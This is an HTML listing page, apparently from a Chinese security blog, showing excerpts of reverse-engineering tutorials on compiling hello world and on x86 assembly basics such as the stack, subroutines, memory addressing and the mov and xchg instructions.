@@ -1,0 +1,1249 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.2.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.2/css/all.min.css" integrity="sha256-xejo6yLi6vGtAjcMIsY8BHdKsLg7QynVlFMzdQgUuy8=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"m0nst3r.me","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.12.3","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="Web安全、渗透测试、网络安全、代码审计、逆向、编程">
+<meta property="og:type" content="website">
+<meta property="og:title" content="m0nst3r&#39;s blog">
+<meta property="og:url" content="https://m0nst3r.me/page/6/index.html">
+<meta property="og:site_name" content="m0nst3r&#39;s blog">
+<meta property="og:description" content="Web安全、渗透测试、网络安全、代码审计、逆向、编程">
+<meta property="og:locale" content="en_US">
+<meta property="article:author" content="m0nst3r">
+<meta property="article:tag" content="Web安全,渗透测试,网络安全,代码审计,逆向,编程">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://m0nst3r.me/page/6/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":true,"isPost":false,"lang":"en","comments":"","permalink":"","path":"page/6/index.html","title":""}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>m0nst3r's blog</title>
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <h1 class="site-title">m0nst3r's blog</h1>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">Hello, Bugs</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+
+
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-overview-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">m0nst3r</p>
+  <div class="site-description" itemprop="description">Web安全、渗透测试、网络安全、代码审计、逆向、编程</div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">65</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">15</span>
+        <span class="site-state-item-name">categories</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">31</span>
+        <span class="site-state-item-name">tags</span>
+      </div>
+  </nav>
+</div>
+
+
+
+        </div>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://m0nst3r.me/re/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E2%80%94%E2%80%94HELLO%20WORLD!.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="m0nst3r">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="m0nst3r's blog">
+      <meta itemprop="description" content="Web安全、渗透测试、网络安全、代码审计、逆向、编程">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | m0nst3r's blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/re/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E2%80%94%E2%80%94HELLO%20WORLD!.html" class="post-title-link" itemprop="url">逆向工程——HELLO WORLD!</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2017-11-27 11:12:00" itemprop="dateCreated datePublished" datetime="2017-11-27T11:12:00+08:00">2017-11-27</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2022-08-08 22:27:53" itemprop="dateModified" datetime="2022-08-08T22:27:53+08:00">2022-08-08</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/category/re/" itemprop="url" rel="index"><span itemprop="name">re</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <blockquote>
+<p>内容主要参考《RE4B》</p>
+</blockquote>
+<p>从今天开始，我们将学习《RE4B》这本书。这本书和汇编基础一起，将做为我们入门逆向工程的基础。</p>
+<p>为了省去大家安装各种不同编译器的麻烦，我们将使用在线工具进行编译，地址如下：<br><a target="_blank" rel="noopener" href="https://gcc.godbolt.org/" title="https://gcc.godbolt.org/">[https://gcc.godbolt.org/]</a></p>
+<h2 id="HELLO-WORLD"><a href="#HELLO-WORLD" class="headerlink" title="HELLO WORLD"></a>HELLO WORLD</h2><p>现在，我们形如演示各种编程书中的最著名的程序：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">	printf(&quot;Hello, world!\n&quot;);</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="x86"><a href="#x86" class="headerlink" title="x86"></a>x86</h3><p>函数调用约定 1，后 面一条指令会把<code>EAX</code>的值当作返回值传递给调用者函数，而调用者函数(caller)会从EAX寄存器里取值， 把它当作返回结果。</p>
+<h4 id="MSVC"><a href="#MSVC" class="headerlink" title="MSVC"></a>MSVC</h4><p>使用在线工具的MSVC编译器，我们可以得到下面的汇编指令结果：</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/re/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E2%80%94%E2%80%94HELLO%20WORLD!.html#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://m0nst3r.me/re/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E2%80%94%E2%80%94%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80%EF%BC%88%E4%BA%94%EF%BC%89.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="m0nst3r">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="m0nst3r's blog">
+      <meta itemprop="description" content="Web安全、渗透测试、网络安全、代码审计、逆向、编程">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | m0nst3r's blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/re/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E2%80%94%E2%80%94%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80%EF%BC%88%E4%BA%94%EF%BC%89.html" class="post-title-link" itemprop="url">逆向工程——汇编基础（五）</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2017-11-22 11:12:00" itemprop="dateCreated datePublished" datetime="2017-11-22T11:12:00+08:00">2017-11-22</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2022-08-08 22:27:53" itemprop="dateModified" datetime="2022-08-08T22:27:53+08:00">2022-08-08</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/category/re/" itemprop="url" rel="index"><span itemprop="name">re</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h2 id="子程序"><a href="#子程序" class="headerlink" title="子程序"></a>子程序</h2><p>在汇编语言中，无门并不能像高级语言中那样，在不和程序其他部分起冲突的情况下，定义和其他主程序或子程序一样的变量名。<br>汇编语言并不注重程序员的负担，它依赖程序员的良好设计，以期发挥CPU的最佳性能。<br>汇编语言不是结构化的语言，它不提供直接的“局部变量”。如果需要，只能<code>通过堆或栈自行实现</code>。</p>
+<p>参数的传递是靠<code>寄存器</code>或<code>堆栈</code>来完成的。高级语言中，子程序（函数／过程，或者类似概念的东西）依赖于堆和栈来传递。</p>
+<h3 id="子程序的执行过程"><a href="#子程序的执行过程" class="headerlink" title="子程序的执行过程"></a>子程序的执行过程</h3><p>无论是C／C++／BASIC／Pascal，子程序的执行过程基本都是一致的。</p>
+<ul>
+<li>调用者将子程序执行完成时应返回的地址／参数压入堆栈。</li>
+<li>子程序使用<code>BP指针+偏移量</code>对栈中的参数<code>寻址</code>，并取出，完成操作。</li>
+<li>子程序使用<code>RET</code>或<code>RETF</code>指令返回。此时，CPU将<code>IP</code>置为堆栈中保存的地址，并继续予以执行。</li>
+</ul>
+<p>毋庸置疑，堆栈在整个过程中发挥着非常重要的作用。不过，本质上对子程序最重要的还是<code>返回地址</code>，如果子程序不知道这个地址，那么系统将会崩溃。<br>调用子程序的指令是<code>CALL</code>，对应的返回指令是<code>RET</code>，另外还有<code>ENTER</code>和<code>LEAVE</code>，她们可以帮助进行堆栈的维护。</p>
+<p><code>CALL</code>指令的参数是<code>被调用子程序的地址</code>。使用宏汇编的时候，这通常是一个标号。CALL和RET，一级ENTER和LEAVE配对，以实现<code>对堆栈的自动操作</code>，而不需要程序员进行PUSH&#x2F;POP，以及跳转的操作，从而提高了效率。</p>
+<blockquote>
+<p>下面一段程序，是从作者文档中抄下来的，我搭建环境并且编译之后，并没有得到相同的汇编代码，所以大家不用拘泥于下面的细节，但是可以从原作者的分析中得到一些有用的知识。</p>
+</blockquote>
+<p>程序是这样的：</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/re/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E2%80%94%E2%80%94%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80%EF%BC%88%E4%BA%94%EF%BC%89.html#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://m0nst3r.me/re/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E2%80%94%E2%80%94%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80%EF%BC%88%E5%9B%9B%EF%BC%89.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="m0nst3r">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="m0nst3r's blog">
+      <meta itemprop="description" content="Web安全、渗透测试、网络安全、代码审计、逆向、编程">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | m0nst3r's blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/re/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E2%80%94%E2%80%94%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80%EF%BC%88%E5%9B%9B%EF%BC%89.html" class="post-title-link" itemprop="url">逆向工程——汇编基础（四）</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2017-11-20 11:12:00" itemprop="dateCreated datePublished" datetime="2017-11-20T11:12:00+08:00">2017-11-20</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2022-08-08 22:27:53" itemprop="dateModified" datetime="2022-08-08T22:27:53+08:00">2022-08-08</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/category/re/" itemprop="url" rel="index"><span itemprop="name">re</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>[TOC]</p>
+<h2 id="堆栈"><a href="#堆栈" class="headerlink" title="堆栈"></a>堆栈</h2><h3 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h3><ol>
+<li><p>堆栈是一个先进后出（FILO）的线性表<br>  <code>FILO</code>是指：<code>最后</code>放进表中的数据在<code>取出</code>时，<code>最先</code>出来，即 Fist in Last Out。<br>  <img src="/images/60108094ba47d6ce8998f695549e24556fa9b08f.png" alt="3rd_1.png"></p>
+</li>
+<li><p>系统堆栈不仅仅是一段内存。<br>  由于CPU对它实施管理，因此你不需要考虑堆栈指针的修正问题。可以把寄存器内容，甚至一个立即数直接放入堆栈里，并在需要的时候将其取出。同时，系统并不要求取出的数据任然回到原来的位置。</p>
+</li>
+</ol>
+<h3 id="堆栈相关指令"><a href="#堆栈相关指令" class="headerlink" title="堆栈相关指令"></a>堆栈相关指令</h3><p>除了显示地操作堆栈（使用<code>push</code>和<code>pop</code>指令）之外，很多指令也需要使用堆栈，如<code>INT</code>、<code>CALL</code>、<code>LEAVE</code>、<code>RET</code>、<code>RETE</code>、<code>IRET</code>等等。配对使用上述指令并不会造成什么问题，然而，如果你打算使用LEAVE、RET、RETE、IRET这样的指令实现跳转（比JMP更为麻烦，然而有时，例如在加密软件中，或者需要修改调用者状态时这是必要的）的话，那么要搞清楚他们做的到底是什么，并且精确而了解自己要做什么。</p>
+<h4 id="push-x2F-pop指令"><a href="#push-x2F-pop指令" class="headerlink" title="push&#x2F;pop指令"></a>push&#x2F;pop指令</h4><p><code>push 寄存器</code>：将一个寄存器中的数据<code>压入</code>堆栈；<br><code>pop 寄存器</code>：将<code>栈顶</code>的数据<code>弹出</code>堆栈，并传入指定的寄存器。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">push ax			;将ax中的数据入栈</span><br><span class="line">pop ax			;将堆栈栈顶的数据弹出并传送给ax</span><br></pre></td></tr></table></figure>
+<p><code>push 段寄存器</code>：将一个段寄存器中的数据压入堆栈；<br><code>pop 段寄存器</code>：将栈顶表示的数据弹出，并传入端寄存器。</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/re/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E2%80%94%E2%80%94%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80%EF%BC%88%E5%9B%9B%EF%BC%89.html#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://m0nst3r.me/re/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E2%80%94%E2%80%94%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80%EF%BC%88%E4%B8%89%EF%BC%89.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="m0nst3r">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="m0nst3r's blog">
+      <meta itemprop="description" content="Web安全、渗透测试、网络安全、代码审计、逆向、编程">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | m0nst3r's blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/re/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E2%80%94%E2%80%94%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80%EF%BC%88%E4%B8%89%EF%BC%89.html" class="post-title-link" itemprop="url">逆向工程——汇编基础（三）</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2017-11-15 11:12:00" itemprop="dateCreated datePublished" datetime="2017-11-15T11:12:00+08:00">2017-11-15</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2022-08-08 22:27:53" itemprop="dateModified" datetime="2022-08-08T22:27:53+08:00">2022-08-08</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/category/re/" itemprop="url" rel="index"><span itemprop="name">re</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>[TOC]</p>
+<p>参考文档：《简明 x86 汇编语言教程》作者：司徒彦南<br>##操作内存<br>我们可以将内存想象为一个顺序的字节流。操作内存是，首先需要的就是他的地址。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov ax,[0]</span><br></pre></td></tr></table></figure>
+<p><code>方括号</code>表示，里面的表达式指定的不是<code>立即数</code>，而是<code>偏移量</code>。在是模式中，<code>DS:0</code>中的那个<code>字</code>会被装入AX。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov [0],ax</span><br></pre></td></tr></table></figure>
+<p>mov指令也可以把数据保存到内存中。<br>###描述内存宽度的操作符</p>
+<table>
+<thead>
+<tr>
+<th align="left">操作符</th>
+<th align="left">意义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">byte ptr</td>
+<td align="left">一个字节（8-bit，1 byte）</td>
+</tr>
+<tr>
+<td align="left">word ptr</td>
+<td align="left">一个字（16-bit）</td>
+</tr>
+<tr>
+<td align="left">dword ptr</td>
+<td align="left">一个双字（32-bit）</td>
+</tr>
+</tbody></table>
+<p>例如，在DS:100h处保存1234h，以字存放：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov word ptr [100h],01234h</span><br></pre></td></tr></table></figure>
+<p>于是，我们将mov指令扩展为：</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/re/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E2%80%94%E2%80%94%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80%EF%BC%88%E4%B8%89%EF%BC%89.html#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://m0nst3r.me/re/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E2%80%94%E2%80%94%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80%EF%BC%88%E4%BA%8C%EF%BC%89.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="m0nst3r">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="m0nst3r's blog">
+      <meta itemprop="description" content="Web安全、渗透测试、网络安全、代码审计、逆向、编程">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | m0nst3r's blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/re/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E2%80%94%E2%80%94%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80%EF%BC%88%E4%BA%8C%EF%BC%89.html" class="post-title-link" itemprop="url">逆向工程——汇编基础（二）</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2017-11-13 11:12:00" itemprop="dateCreated datePublished" datetime="2017-11-13T11:12:00+08:00">2017-11-13</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2022-08-08 22:27:53" itemprop="dateModified" datetime="2022-08-08T22:27:53+08:00">2022-08-08</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/category/re/" itemprop="url" rel="index"><span itemprop="name">re</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>[TOC]</p>
+<p>参考文档：《简明 x86 汇编语言教程》作者：司徒彦南<br>##使用寄存器<br>对x86基本寄存器的认识，对于一个汇编语言编程人员来说是不可或缺的。</p>
+<p>###汇编语言中的整数常量表示<br>####十进制整数<br>这是<code>汇编器</code>默认的数制。直接用我们熟悉的表示方式表示即可。例如，1234表示十进制的1234。不过，如果你指定了使用其他数制，或者有凡事都进行完整定义的习惯，也可以写成<code>[十进制数]d</code>或<code>[十进制数]D</code>在行式。<br>####十六进制数<br>这是<code>汇编程序</code>中最常用的数制。十六进制数表示为<code>0[十六进制数]h</code>或<code>0[十六进制数]H</code>，其中，如果十六进制数的第一位是数字，则开头的0可以省略，例如<code>7fffh</code>，<code>0ffffh</code>。<br>####二进制数<br>这也是一种常用的数制。二进制表示为<code>[二进制数]b</code>或<code>[二进制数]B</code>。一般程序中用二进制数表示掩码等数据非常的直观，但需要些很长的数据（4位二进制数相当于一位十六进制数）。例如，1010110b。<br>####八进制数<br>八进制数现在已经不是很常用了，一个典型的例子是Unix的文件属性。八进制数的形式是<code>[八进制数]q</code>、<code>[八进制数]Q</code>、<code>[八进制数]o</code>、<code>[八进制数]O</code>。例如，777Q。<br><strong>调试器默认使用十六进制表示整数</strong></p>
+<p>###简单指令<br>下面介绍一些指令，在这之前，我们约定：</p>
+<ol>
+<li>reg32，32-bit寄存器，如EAX、EBX等。</li>
+<li>reg16，16-bit寄存器，如AX，BX等。</li>
+<li>reg8？，8-bit寄存器，如AL，BH等。</li>
+<li>imm32，32-bit立即数，可以理解为常数。</li>
+<li>imm16，16-bit立即数。</li>
+<li>imm8？ 8-bit立即数。</li>
+</ol>
+<p>####MOV指令<br><code>mov</code>，要move的缩写，它可以将数据<code>发送到</code>寄存器中。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mov reg32,(reg32 | imm8 | imm16 | imm32)</span><br><span class="line">mov reg16,(reg16 | imm8 | imm16)</span><br><span class="line">mov reg8,(reg8 | imm8)</span><br><span class="line">	</span><br><span class="line">	例如：</span><br><span class="line">mov eax,ebx			;ebx内容送入eax</span><br><span class="line">mov ecx,ebx			;edx内容送入ecx</span><br></pre></td></tr></table></figure>
+<p><code>mov eax,010h</code>表示在EAX寄存器中载入<code>00000010h</code>。</p>
+<p>####xchg指令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">xchg reg32,reg32</span><br><span class="line">xchg reg16,reg16</span><br><span class="line">xchg reg8,reg8</span><br><span class="line">	</span><br><span class="line">	例如：</span><br><span class="line">	xchg ebx,ecx，表示ebx与ecx的数值被交换。</span><br></pre></td></tr></table></figure>
+          <!--noindex-->
+            <div class="post-button">
